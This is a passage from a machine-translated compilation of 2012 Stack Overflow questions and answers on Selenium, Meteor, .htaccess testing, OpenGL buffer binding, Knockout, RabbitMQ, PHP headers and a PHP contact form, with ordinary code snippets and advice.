        Log.e("log_tag", "Error parsing data "+e.toString());
} 
```

# css - 如何在 CSS 中验证是否在 Selenium 2 中禁用了文本字段/其他字段进行编辑？

> ID：12014744
> 
> 赞同：0
> 
> 时间：2012-08-18T00:25:28.360
> 
> 标签：css, selenium, selenium-webdriver

该页面是由 CSS 使用 jquery 创建的，我使用 selenium2 和 junit 进行验证。如果任何人都可以提供一种方法来识别字段被禁用并使用断言语句，那将是非常有帮助的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-19T19:49:45.380

我假设您正在使用 Selenium 2 进行测试。

该类提供了一种使用和方法`WebDriver`检索页面上所有内容的方法。这两种方法都采用类实例形式的选择器。因此，在您的情况下，您将不得不使用一个选择器来查找您正在寻找的输入字段，例如`WebElements``findElement``findElements``By`

```
WebElement element = webDriver.findElement(By.name("password")); 
```

然后你可以使用

```
if (element.isDisplayed() && element.isEnabled()) {
  //your code here
} 
```

或者

```
assert (element.isDisplayed() && element.isEnabled()); 
```

验证该字段是否已显示和启用。

# node.js - 我如何知道我的流星应用程序正在使用的节点版本？

> ID：12014750
> 
> 赞同：21
> 
> 时间：2012-08-18T00:26:22.780
> 
> 标签：node.js, meteor

我已经在linux下安装了meteor，我真的不知道node.js的meteor用的是哪个版本。

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2015-04-08T06:32:01.017

***MacOS 和 Meteor 的答案 > v1.1***

`node`二进制文件位于流星工具的 dev_bundle 中：

> ~/.meteor/packages/meteor-tool/1.1.3/mt-os.osx.x86_64/dev_bundle/bin

```
$ cd ~/.meteor/packages/meteor-tool/1.1.3/mt-os.osx.x86_64/dev_bundle/bin
$ ./node -v
v0.10.36 
```

*注意：meteor-tool 版本与 Meteor 版本不**匹配**，但在 99% 的情况下，您可以假设您当前的 Meteor 使用的是最新版本。*

至少在**Meteor >= 1.5**中，您还可以直接访问与 Meteor 捆绑的 NodeJS 并找出版本：

```
meteor node -v 
```

*感谢 Mickael 指出这一点。*

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2016-04-01T06:06:24.170

我刚刚`meteor node -v`在流星应用程序中输入并在 CLI 上重新获得了 v0.10.43。

当我输入时，`node -v`我得到 v5.5.0 作为返回值。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2015-11-29T17:23:18.207

在 Meteor 1.2.1 中，您可以在文件夹中找到一个名为`.node_version.txt`的`.meteor/local/build/`文件。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2016-12-23T14:52:50.010

我在 Meteor 论坛上找到了这篇[文章。](https://forums.meteor.com/t/which-nodejs-version-does-meteor-1-3-2-4-use/25616/4)

采用

```
meteor node -v 
```

知道流星使用的nodejs版本。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2012-08-18T02:06:44.807

~~简单`node -v`的应该告诉你。~~ 更新：至少在 Debianish 系统上，meteor 在 /usr/lib/meteor/bin 中安装了自己的节点副本，所以`/usr/lib/meteor/bin/node -v`应该告诉你。如果它不存在，它可能在 /usr/local/lib... 在我的 Debian 系统上，版本是 0.6.17。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-08-12T00:58:44.717

另一种方法是查看github 项目上的[History.md文件。](https://github.com/meteor/meteor/blob/master/History.md)当我写这个答案时，最后一次更新是在流星 0.5.5 上，他们将 node.js 更新到 v0.8.18。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-09-08T21:01:18.733

您可以使用[mnode](https://www.npmjs.org/package/mnode)，但它似乎不适用于流星 0.9。我还推荐阅读这篇[Arunoda 文章](https://meteorhacks.com/how-meteor-uses-node.html)。它最后有另一种方法。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-11-04T07:03:00.200

在我看来，他们现在需要更高版本：

`Meteor requires Node v0.10.40 or later.`

是我安装 v0.10.36 时收到的错误。nodejs 版本管理的好工具是[https://www.npmjs.com/package/n](https://www.npmjs.com/package/n)

# .htaccess - 离线测试htaccess代码

> ID：12014755
> 
> 赞同：0
> 
> 时间：2012-08-18T00:26:39.553
> 
> 标签：.htaccess, offline

我想离线测试我的网站，但这是我的问题：

我该如何测试

```
RewriteEngine On
RewriteCond %{HTTP_HOST} !^www\.
RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L] 
```

离线？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:37:50.107

如果我正确理解了这个问题，那么您所要做的就是确保您的网站名称指向您的本地 PC/服务器。以下是在 OSX 中的操作方法，假设如下：
- 您将指向本地计算机，地址为**127.0.0.1**
- 您的域名是**yourdomain.com**。
用适当的值替换上述内容。

**如何在 OSX 中编辑主机文件**

1.  打开终端
2.  通过键入编辑主机文件`sudo nano /private/etc/hosts`
3.  添加一行包含`127.0.0.1 yourdomain.com`
4.  添加一行包含`127.0.0.1 www.yourdomain.com`
5.  保存主机文件
6.  通过运行命令清空 DNS 缓存`dscacheutil -flushcache`

现在，每次您尝试打开 yourdomain.com 时，它都会尝试连接到您的本地计算机。要撤消上述操作，只需再次打开文件并注释掉（或删除）您添加的行，然后刷新 DNS 缓存。

# opengl - OpenGL - 错误地创建多个 VBO

> ID：12014760
> 
> 赞同：1
> 
> 时间：2012-08-18T00:27:37.783
> 
> 标签：opengl, vbo

我遇到的问题是，一旦我为关卡中的主要几何体创建了 VBO，当我为对象创建第二个时，对象 VBO 就不起作用。我假设我有一些不正确的缓冲区绑定，但我一辈子都找不到它。我先创建关卡 VBO，然后再创建对象 VBO，当我禁用关卡 VBO 的创建时，对象 VBO 会正确创建。

这是我的代码。

在 level.h 中：

```
// Zone VBO
GLuint zoneVBO;
GLuint zoneVAO;
GLuint zoneIBO;

// Object VBO
GLuint objVBO;
GLuint objVAO;
GLuint objIBO; 
```

区域（几何）VBO的创建 - 就像一个注释一样，创建在两个VBO中都可以正常工作，所以数据移动不是问题，我认为这是一个绑定错误：

```
void WLD::createZoneVBO()
{
    // Get the size for our VBO
    int numVert = 0;
    int numPoly = 0;
    int VBOsize = 0;
    int IBOsize = 0;

    // Get the count of vertices and polygons
    for(int i = 0; i < zoneFragMap[0x36]; i++)
    {
        numVert += zmeshes[i].numVert;
        numPoly += zmeshes[i].numPoly;
        VBOsize += zmeshes[i].numVert * sizeof(Vertex);
        IBOsize += zmeshes[i].numPoly * 3 * sizeof(GLuint);
    }

    // Create the IBO and VBO data
    GLuint* iboData = new GLuint[zonePolyProcessed * 3];
    Vertex* vboData = new Vertex[zoneVertProcessed];

    int iboPos = 0;
    int vboPos = 0;

    // Create the VBO and IBO
    for(int i = 0; i < zoneFragMap[0x36]; i++)
    {
        // Copy the data to the IBO
        memcpy(&iboData[iboPos], zmeshes[i].indices, zmeshes[i].numPoly * 3 * sizeof(GLuint));//sizeof(*zmeshes[i].indices));

        // Advance the position
        iboPos += zmeshes[i].numPoly * 3;

        // Copy the data to the VBO
        memcpy(&vboData[vboPos], zmeshes[i].vertices, zmeshes[i].numVert * sizeof(Vertex));//sizeof(*zmeshes[i].vertices));

        // Advance the position
        vboPos += zmeshes[i].numVert;
    }

    //Create VBO for the triangle
    glGenBuffers(1, &zoneVBO);
    glBindBuffer(GL_ARRAY_BUFFER, zoneVBO);
    glBufferData(GL_ARRAY_BUFFER, zoneVertProcessed * sizeof(Vertex), vboData, GL_STATIC_DRAW);
    glBindBuffer(GL_ARRAY_BUFFER, 0);

    //Create the IBO for the triangle
    //16 bit indices
    //We could have actually made one big IBO for both the quad and triangle.
    glGenBuffers(1, &zoneIBO);
    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, zoneIBO);
    glBufferData(GL_ELEMENT_ARRAY_BUFFER, zonePolyProcessed * 3 * sizeof(GLuint), iboData, GL_STATIC_DRAW);
    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, 0);

    // Create the VAO
    glGenVertexArraysAPPLE(1, &zoneVAO);
    glBindVertexArrayAPPLE(zoneVAO);
    glBindBuffer(GL_ARRAY_BUFFER, zoneVAO);
    glEnableVertexAttribArray(0);
    glEnableVertexAttribArray(1);
    glEnableVertexAttribArray(2);
    glEnableVertexAttribArray(3);
    glVertexAttribPointer(opaque["position"], 3, GL_FLOAT, GL_FALSE, sizeof(Vertex), BUFFER_OFFSET(0));
    glVertexAttribPointer(opaque["normal"], 3, GL_FLOAT, GL_FALSE, sizeof(Vertex), BUFFER_OFFSET(sizeof(float) * 3));
    glVertexAttribPointer(opaque["texcoord"], 2, GL_FLOAT, GL_FALSE, sizeof(Vertex), BUFFER_OFFSET(sizeof(float) * 6));
    glVertexAttribPointer(opaque["color"], 4, GL_FLOAT, GL_FALSE, sizeof(Vertex), BUFFER_OFFSET(sizeof(float) * 8));
    glBindBuffer(GL_ARRAY_BUFFER, 0);
    glBindVertexArrayAPPLE(0);

    delete[] iboData;
    delete[] vboData;
} 
```

和对象 - 同样，对象几何体已完美加载，但前提是尚未加载区域几何体：

```
void WLD::createObjectVBO()
{
    // Get the size for our VBO
    int numVert = 0;
    int numPoly = 0;
    int VBOsize = 0;
    int IBOsize = 0;

    // Get the count of vertices and polygons
    for(int i = 0; i < objFragMap[0x36]; i++)
    {
        numVert += objMeshes[i].numVert;
        numPoly += objMeshes[i].numPoly;
        VBOsize += objMeshes[i].numVert * sizeof(Vertex);
        IBOsize += objMeshes[i].numPoly * 3 * sizeof(GLuint);
    }

    // Create the IBO and VBO data
    GLuint* iboData = new GLuint[objPolyProcessed * 3];
    Vertex* vboData = new Vertex[objVertProcessed];

    int iboPos = 0;
    int vboPos = 0;

    // Create the VBO and IBO
    for(int i = 0; i < objFragMap[0x36]; i++)
    {
        // Copy the data to the IBO
        memcpy(&iboData[iboPos], objMeshes[i].indices, objMeshes[i].numPoly * 3 * sizeof(GLuint));//sizeof(*zmeshes[i].indices));

        // Advance the position
        iboPos += objMeshes[i].numPoly * 3;

        // Copy the data to the VBO
        memcpy(&vboData[vboPos], objMeshes[i].vertices, objMeshes[i].numVert * sizeof(Vertex));//sizeof(*zmeshes[i].vertices));

        // Advance the position
        vboPos += objMeshes[i].numVert;
    }

    //Create VBO for the triangle
    glGenBuffers(1, &objVBO);
    glBindBuffer(GL_ARRAY_BUFFER, objVBO);
    glBufferData(GL_ARRAY_BUFFER, objVertProcessed * sizeof(Vertex), vboData, GL_STATIC_DRAW);
    glBindBuffer(GL_ARRAY_BUFFER, 0);

    //Create the IBO for the triangle
    //16 bit indices
    //We could have actually made one big IBO for both the quad and triangle.
    glGenBuffers(1, &objIBO);
    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, objIBO);
    glBufferData(GL_ELEMENT_ARRAY_BUFFER, objPolyProcessed * 3 * sizeof(GLuint), iboData, GL_STATIC_DRAW);
    glBindBuffer(GL_ARRAY_BUFFER, 0);

    // Create the VAO
    glGenVertexArraysAPPLE(1, &objVAO);
    glBindVertexArrayAPPLE(objVAO);
    glBindBuffer(GL_ARRAY_BUFFER, objVAO);
    glEnableVertexAttribArray(0);
    glEnableVertexAttribArray(1);
    glEnableVertexAttribArray(2);
    glEnableVertexAttribArray(3);
    glVertexAttribPointer(opaque["position"], 3, GL_FLOAT, GL_FALSE, sizeof(Vertex), BUFFER_OFFSET(0));
    glVertexAttribPointer(opaque["normal"], 3, GL_FLOAT, GL_FALSE, sizeof(Vertex), BUFFER_OFFSET(sizeof(float) * 3));
    glVertexAttribPointer(opaque["texcoord"], 2, GL_FLOAT, GL_FALSE, sizeof(Vertex), BUFFER_OFFSET(sizeof(float) * 6));
    glVertexAttribPointer(opaque["color"], 4, GL_FLOAT, GL_FALSE, sizeof(Vertex), BUFFER_OFFSET(sizeof(float) * 8));
    glBindBuffer(GL_ARRAY_BUFFER, 0);
    glBindVertexArrayAPPLE(0);
} 
```

渲染这两个 VBO：

```
 opaque.Use();
        glBindVertexArrayAPPLE(getVAO(2));
        glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, zoneIBO);
        glBindBuffer(GL_ARRAY_BUFFER, zoneVBO);
        glUniformMatrix4fv(opaque("camera"), 1, GL_FALSE, glm::value_ptr(cameraMat));
        renderGeometry(&cameraMat, 0, curRegion);
        glBindVertexArrayAPPLE(0);
        glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, 0);
        glBindBuffer(GL_ARRAY_BUFFER, 0);

        glBindVertexArrayAPPLE(objVAO);
        glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, objIBO);
        glBindBuffer(GL_ARRAY_BUFFER, objVBO);
        glUniformMatrix4fv(opaque("camera"), 1, GL_FALSE, glm::value_ptr(cameraMat));
        renderObjects(&cameraMat);
        glBindVertexArrayAPPLE(0);
        glBindBuffer(GL_ARRAY_BUFFER, 0);
        glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, 0);
        opaque.UnUse(); 
```

总而言之，我认为这是创建 VBO 的一个问题。我认为我做错了什么，并在应该绑定的时候保持绑定。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T01:18:45.320

```
// Create the VAO
glGenVertexArraysAPPLE(1, &zoneVAO);
glBindVertexArrayAPPLE(zoneVAO);
glBindBuffer(GL_ARRAY_BUFFER, zoneVAO);  //<-------
glEnableVertexAttribArray(0); 
```

在我突出显示的行中，这看起来应该是`zoneVBO`，而不是`zoneVAO`。

您应该使用 glGetError 检查错误，它可能已经发现了这个错误。

在调用 renderObjects 之前也不需要绑定缓冲区。如果您将顶点指针存储在 VAO 中，则无需绑定缓冲区，因为顶点指针已经指向正确的位置。

# knockout.js - KO：如何订阅为后期处理更新的 UI？

> ID：12014764
> 
> 赞同：0
> 
> 时间：2012-08-18T00:27:45.853
> 
> 标签：knockout.js

在我的页面中，我有一个下拉菜单（选择），然后是一个表格，两者都绑定到视图模型。当我更改下拉列表时，表格会刷新选择中与该项目关联的数据。

我想在填充表格后对其进行一些 UI 处理。我尝试订阅下拉选择（它确实被触发并调用了我的函数），但表数据在订阅完成后更新。

我想要做的是使用这样的简单函数更新表格背景行颜色：

```
updateRowBgColors = function (tableId) {
    $("#" + tableId + " tr:gt(0):odd").css("background-color", "#f7f7f7");
    $("#" + tableId + " tr:gt(0):even").css("background-color", "#fff");
}; 
```

是的，我知道我可以为 html 中的数据绑定中的交替行设置一个类，但这并不能回答我关于为什么这不起作用的问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T07:49:01.310

您可以将 afterRender 绑定与您的[foreach 绑定](http://knockoutjs.com/documentation/foreach-binding.html)一起使用：

```
<table>
    <tbody data-bind="foreach: {data: people, afterRender: doYourThing}">
        <tr>
            <td data-bind="text: Name"></td>
            <td data-bind="text: Number"></td>
        </tr>
    </tbody>
</table> 
```

在您的视图模型中：

```
self.doYourThing = function(insertedDomElementArray, dataItem) {
    $('tr:odd').css("background-color", "#f7f7f7");
    $('tr:even').css("background-color", "#fff");
}; 
```

[小提琴](http://jsfiddle.net/jgoemat/SrfSt/2/)

# database - 在流行的 BaaS 中使用自己的数据存储的方法

> ID：12014765
> 
> 赞同：3
> 
> 时间：2012-08-18T00:28:22.687
> 
> 标签：database, mobile, amazon-web-services, data-storage

我们正在开发一个应用程序，该应用程序需要客户端（移动设备）将大小为 5MB 或更大的文件发送到服务器组件进行处理，我们希望得到以下方面的建议：

有没有办法将后端即服务 (BaaS) 平台与我们自己的数据存储（在我们的特定案例中托管在 AWS）相结合？如果来自客户端的文件直接发送到我们自己在云中的数据库，而不是存储在 BaaS 服务器中，我们基本上更愿意。
换句话说，我们需要一个 BaaS 平台或解决方案，允许解绑/绕过其数据存储功能，以便我们可以仅将 BaaS 用于其其余设施（例如客户端身份验证、REST API 等）。
我们在 EC2 中有自己的服务器，这些服务器是文件的主要处理部分所需要的，并且只需要 BaaS 平台即可在短时间内启动我们的应用程序。在大多数情况下，将文件从 BaaS 平台自己的数据存储中提取到 EC2 服务器会导致总体延迟开销以及额外的带宽成本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T01:31:01.553

I'd faced a similar dilemma while building my app. In my case, I had to upload and store photos uploaded by users somewhere AND I didn't want to build a backend myself. So, I decided to use Amazon S3 to store the photos uploaded by the user and used SimpleDB as it offered me greater flexibility and ease of use than using a MySQL backend. Now, obviously, SimpleDB is not a Backend-as-a-Service platform but I was looking for the same convenience as you are.

So what I'm suggesting is that you use a Backend-as-a-Service platform like [Parse](https://parse.com/) (which has an excellent freemium model), [CloudMine](https://cloudmine.me/) (another great service but with tight limitations on the freemium model i.e only 500 free users/month) or [Kinvey](http://www.kinvey.com/) (which markets itself as the first BaaS platform, I don't have much information about it but it's definitely worth a look). And use S3 for your data storage. This way you can use the BaaS for client authentication, the REST API etc as you mentioned and you can continue using S3\. All you need to do is create an appropriate naming scheme for your S3 buckets and objects such that you can easily identify which object belongs to which user, this can be done easily using a prefix-based naming scheme (seeing as S3 doesn't offer the ability to create sub-folders in buckets). Now whenever you need to pull some client information you can make a call to your BaaS with the client authenticated details and whenever you need access to your data-storage you can make a call to S3 using the Android SDK provided by AWS to retrieve the objects that belong to that particular user. Seeing as you plan on using EC2 to process those files transferring those files from S3 to EC2 should not cost you any extra bandwidth (I might be wrong here because I haven't looked into it but as far as I can remember transferring data within AWS is free).

Do let me know if you have additional questions.

# c++ - 我如何才能正确地将其转换为 UV 贴图？

> ID：12014766
> 
> 赞同：0
> 
> 时间：2012-08-18T00:28:39.243
> 
> 标签：c++, directx, uv-mapping

好的，所以我有我的代码来使用 C++ 和 DirectX 绘制一个大景观。我用一种纹理对其进行纹理化，然后需要添加更多纹理。我看到人们在他们有 1 个纹理图像并且图像包含 2 个纹理的情​​况下这样做。这就是我制作的，它是 256x128 的图像。我现在的问题是，由于我的地形自动生成了 UV 贴图 1 纹理的坐标，现在它同时显示了两种纹理。我需要做到这一点，所以当世界的高度足够高时，它是 1 个纹理，而下面的一切都是另一个纹理。我的UV坐标代码，

顶点[y * WIDTH * x].U = x / 1.28;

顶点[y * WIDTH * x].V = y / 1.28;

这些是我的映射坐标，X 是它正在绘制的顶点的当前 X 值，Y 值是它当前的 y 位置。高度图是 128x128，所以我除以 1.28 以使每个多边形都有贴图 UV 贴图。高度也被计算出来，因为我正在加载一个高度图并且我试图得到它，所以当它足够高时，它会 UV 映射图像的一半，如果它是另一个，它会 UV 映射图像的另一侧。有人请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T17:56:33.650

```
bool topTexture = height[x][y] > threshold;
float u = x / 1.28;
float v = y / 1.28;
Vertices[y * WIDTH * x].U = (u - (int)u) / 2 + (topTexture ? 0.5 : 0);
Vertices[y * WIDTH * x].V = (v - (int)v) / 2 + (topTexture ? 0.5 : 0); 
```

您可能希望在阈值级别混合两种纹理。然后，您必须在 PixelShader 中进行操作。

# css - 如何仅使用 CSS 渲染选中的复选框？

> ID：12014767
> 
> 赞同：4
> 
> 时间：2012-08-18T00:28:55.417
> 
> 标签：css, checkbox

这可能非常愚蠢而且有点尴尬，但我正在努力弄清楚如何使用 CSS 使复选框“选中”？

情况是，如果父母有一个班级`setup`（例如），我希望所有`setup`作为父母的复选框都被选中。我猜这在纯 CSS 中是不可行的，对吗？我不介意使用 JS，但我很好奇是否可以切换复选框的状态及其父级的状态（通过切换类）。

这是一个可以玩的[小提琴。](http://jsfiddle.net/nupul/5SZMg/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T00:33:09.197

被“选中”的复选框不是一种样式。这是一种状态。CSS 无法控制状态。您可以通过使用复选标记和列表的背景图像来伪造某些东西，但这并不是您所说的。

更改复选框状态的唯一方法是在 HTML 中的服务器端或使用 Javascript。

**编辑**

这是那个伪代码的小提琴。事实是，这毫无意义。

这意味着您需要将 CSS 类添加到服务器上要让 jQuery “检查”的元素。如果您这样做，您不妨在使用时添加实际元素属性。

[http://jsfiddle.net/HnEgT/](http://jsfiddle.net/HnEgT/)

所以，这让我想知道我是否只是误解了你在说什么。我开始认为有一个客户端脚本在改变状态，而您正在寻找监控？

**编辑 2**

根据评论的一些反映和一些快速挖掘，如果您想要一个 JavaScript 解决方案来检查复选框，如果有其他 JavaScript 插件可能会更改属性值（没有事件触发器的东西），唯一的解决方案是做一个简单的“超时”循环，不断检查给定类的一组元素并更新它们。

然后，您所要做的就是设置您希望此超时触发的频率。从某种意义上说，它是一种“长轮询”形式，但实际上并没有去服务器进行数据更新。都是客户端。我想这就是所谓的“超时”。=P

这是我在该主题上找到的教程：

[http://darcyclarke.me/development/detect-attribute-changes-with-jquery/](http://darcyclarke.me/development/detect-attribute-changes-with-jquery/)

我会看看我是否可以制作一个 jQuery 示例。

**更新**

这是一个超时侦听器的 jsfiddle，用于检查 CSS 类是否添加到复选框并将其状态设置为“已选中”。

[http://jsfiddle.net/HnEgT/5/](http://jsfiddle.net/HnEgT/5/)

我添加了第二个函数，每隔几秒钟将“已检查”类随机添加到复选框。

我希望这会有所帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:33:44.400

*在纯*CSS中是不可能的。

但是，您可以有一个附加到类的所有元素的 jQuery 事件，从而触发基于类分配的检查或取消检查。

或许是这样的：

```
function toggleCheck(className){
 $("."+className).each( function() {
  $(this).toggleClass("checkedOn");
 });
 $(".checkedOn").each( function() {
  $(this).checked = "checked";
 });
} 
```

# android - 将两个浮点数返回到上一个活动

> ID：12014768
> 
> 赞同：1
> 
> 时间：2012-08-18T00:28:57.127
> 
> 标签：android, android-intent, android-activity

我`startActivityForResult`用来显示新活动（地图活动）。在我使用的新活动`setResult`中。

如何将两个浮点值返回到以前的活动（地图活动中的经度、纬度）？

可能吗 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T00:33:27.283

您可以使用以下代码

```
Intent intent = new Intent();
intent.putExtra("latitude", latitude);
intent.putExtra("longitude", longitude);
setResult(RESULT_OK, intent); 
```

然后，您可以从以前的活动中检索它们

# php - 页面加载后发送 404 标头

> ID：12014771
> 
> 赞同：0
> 
> 时间：2012-08-18T00:29:27.093
> 
> 标签：php, .htaccess, http-status-code-404

我试图在页面加载后发送 404 标头，并想知道是否有任何解决方案。本质上，搜索数据库以查看 url 是否有效并对应于有效内容。如果没有，它将“包含（）”一个 error.php 文件。

无论如何，我可以编写一个 htaccess 规则，说明每当加载此文件时，抛出 404？我怎么能在error.php文件中发送那个404，因为它不是第一个显示的东西？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T00:35:11.893

在输出任何错误文本之前，首先在 error.php 上调用它。

```
<?php
    header("HTTP/1.0 404 Not Found");
?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T00:40:15.703

您始终可以使用标头功能，只需记住在输出任何其他内容之前执行此操作。

我建议这样做而不是包含另一个文件，然后将您的服务器配置为提供适当的 404 文件。

[PHP 文档头函数](http://php.net/manual/en/function.header.php)

# c# - RabbitMQ 出队后正文中缺少数据

> ID：12014775
> 
> 赞同：5
> 
> 时间：2012-08-18T00:30:00.193
> 
> 标签：c#, asp-classic, rabbitmq

我正在与 RabbitMQ 一起处理其他人的项目，并且遇到了出队和丢失数据的问题。

当我发布时，数据都以字符串形式存在，并且它也正确地存在于 RabbitMQ 队列中。当我拉出数据时，数据的但像用户 ID 一样在那里，但其余的都消失了。我查看了整个代码，我相当肯定它发生在 RabbitMQ 上，并且在我出队时发生。任何帮助将不胜感激。谢谢。这是发布之前的代码。

```
 private bool sendJobToMQ(EncodeJobModel job, string p_correlation_id, string p_request_routing_key)
    {
        JavaScriptSerializer ser = new JavaScriptSerializer();
        StringBuilder sb_job = new StringBuilder();
        ser.Serialize(job, sb_job);
        string rpc_reply_queue;

        ConnectionFactory factory = new ConnectionFactory();
        factory.HostName = HOST_NAME;
        factory.VirtualHost = VHOST_NAME;
        factory.UserName = USERNAME;
        factory.Password = PASSWORD;
        IConnection rabconn = factory.CreateConnection();
        IModel sender_channel = rabconn.CreateModel();
        try
        {
            sender_channel.ExchangeDeclare(EXCHANGE_NAME, ExchangeType.Direct, true, false, null);
        }
        catch (Exception err)
        {
            logger.Error("Error Declaring Exchange " + EXCHANGE_NAME + ": " + err.ToString());
            return false;
        }
        try
        {
            sender_channel.QueueDeclare(REQUEST_QUEUE, true, false, false, null);
        }
        catch (Exception err)
        {
            logger.Error("Error QueueDeclare (" + REQUEST_QUEUE + " true, false, false, null): " + err.ToString());
            return false;
        }
        try
        {
            sender_channel.QueueBind(REQUEST_QUEUE, EXCHANGE_NAME, REQUEST_ROUTING_KEY, null);
        }
        catch (Exception err)
        {
            logger.Error("Error QueueBind (" + REQUEST_QUEUE + " -> " + EXCHANGE_NAME + " " + REQUEST_ROUTING_KEY + ", null): " + err.ToString());
            return false;
        }

        //rpc_reply_queue = sender_channel.QueueDeclare("rq_" + job.encodejob_id.ToString(), false, false, true, null);
        //////bind the rpc reply queue to the exchange via a routing key (I appended _routingkey to signify this)
        //sender_channel.QueueBind(rpc_reply_queue, EXCHANGE_NAME, rpc_reply_queue + "_routingkey");

        //// Not sure what the props object is for yet but you can try to pass null in the mean time - Steve "Apeshit" Han
        BasicProperties props = new BasicProperties();
        props.CorrelationId = p_correlation_id;
        //props.ReplyTo = rpc_reply_queue;

        try
        {
            sender_channel.BasicPublish(EXCHANGE_NAME, REQUEST_ROUTING_KEY, props, Encoding.UTF8.GetBytes(sb_job.ToString()));

        } 
```

以及出队的代码。

```
 QueueingBasicConsumer consumer = new QueueingBasicConsumer(p_channel);
        string consumerTag = p_channel.BasicConsume(p_queue, false, consumer);
        if (_is_console && Environment.UserInteractive)
            Console.WriteLine("Listening...");
        while (m_Listen)
        {
            try
            {
                //get the properties of the message, including the ReplyTo queue, to which we can append '_routingkey' (designated by me), to reply with messages
                BasicDeliverEventArgs e;
                Object message;
                if (!consumer.Queue.Dequeue(4000, out message)) {
                    // we do not wait to indefinitely block on waiting for the queue
                    // if nothing in queue continue loop iteration and wait again
                    continue;
                }

                // cast as necessary back to BasicDeliverEventArgs
                e = (BasicDeliverEventArgs)message;
                IBasicProperties props = e.BasicProperties;
                //get the Correlation ID sent by the client to track the job
                string client_correlation_id = props.CorrelationId;
                // I left out the reply_to field in the wizard, it can be set back in ApiEncodeServiceDefault - Steve "Smurfing Smurf" Han
                //string reply_to = props.ReplyTo;

                //get the body of the request
                byte[] body = e.Body;
                string body_result = Encoding.UTF8.GetString(body);
                bool redelivered = e.Redelivered; 
```

e.Body 字符串缺少数据。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T01:43:21.077

如果您没有任何消息，为什么要继续最好在收到消息之前阻止，否则该过程不有趣（在没有数据的情况下工作？）尝试这样

```
QueueingBasicConsumer consumer = new QueueingBasicConsumer(channel);
channel.BasicConsume(queueName, null, consumer);
while (m_Listen) {
try {
RabbitMQ.Client.Events.BasicDeliverEventArgs e =
(RabbitMQ.Client.Events.BasicDeliverEventArgs)
consumer.Queue.Dequeue();
IBasicProperties props = e.BasicProperties;
byte[] body = e.Body;
// ... process the message
channel.BasicAck(e.DeliveryTag, false);
} catch (OperationInterruptedException ex) {
// The consumer was removed, either through
// channel or connection closure, or through the
// action of IModel.BasicCancel().
break;
} 
```

}

# php - 添加验证后 PHP 表单停止工作

> ID：12014776
> 
> 赞同：1
> 
> 时间：2012-08-18T00:30:09.223
> 
> 标签：php, forms, validation

这里的第一个问题，所以提前谢谢！

我试图纠正的提交表单在集成验证脚本后停止工作。尽管从未发送过邮件，但它似乎可以工作。

HTML：

```
 <script type="text/javascript" src="js/jquery-1.7.1.min.js"></script>
                <script type="text/javascript" src="js/jquery.validate.min.js"></script>

<script type="text/javascript">
/**
  * Basic jQuery Validation Form Demo Code
  * Copyright Sam Deering 2012
  * Licence: http://www.jquery4u.com/license/
  */
(function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#contactform").validate({
                rules: {
                    firstname: "required",
                    lastname: "required",
                    email: {
                        required: true,
                        email: true
                    },
                    phone: "required",
                    comment: "required",
               },
                messages: {
                    firstname: "Please enter your firstname",
                    lastname: "Please enter your lastname",
                    email: "Please enter a valid email address",
                    phone: "Please enter a valid email phone number",
                    comment: "Please enter your reason for inquiry"
                },
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
</script> 
```

表格：

```
<form action="send_form_email.php" method="post" id="contactform">

    <div id="form-content">
        <fieldset>

            <div class="fieldgroup">
                <label for="firstname">First Name*</label>
                <input type="text" name="firstname">
            </div>

            <div class="fieldgroup">
                <label for="lastname">Last Name*</label>
                <input type="text" name="lastname">
            </div>

            <div class="fieldgroup">
                <label for="email">Email*</label>
                <input type="text" name="email">
            </div>

            <div class="fieldgroup">
                <label for="phone">Phone*</label>
                <input type="text" name="phone">
            </div>

            <div class="fieldgroup">
                <label for="comment">Reason for Inquiry*</label>
                <textarea name="comment"></textarea>
            </div>

            <div class="fieldgroup">
                <input type="submit" value="Sumbit">
            </div>

        </fieldset>
    </div>
</form> 
```

send_form_email.php：

```
<?php
if(isset($_POST['email'])) {

    // EDIT THE 2 LINES BELOW AS REQUIRED
    $email_to = "donliggett@gmail.com";
    $email_subject = "Web Submission";

    $first_name = $_POST['firstname']; // required
    $last_name = $_POST['lastname']; // required
    $email_from = $_POST['email']; // required
    $telephone = $_POST['telephone']; // not required
    $reason = $_POST['comment']; // required

    $email_message = "Form details below.\n\n";

    function clean_string($string) {
      $bad = array("content-type","bcc:","to:","cc:","href");
      return str_replace($bad,"",$string);
    }

    $email_message .= "First Name: ".clean_string($first_name)."\n";
    $email_message .= "Last Name: ".clean_string($last_name)."\n";
    $email_message .= "Email: ".clean_string($email_from)."\n";
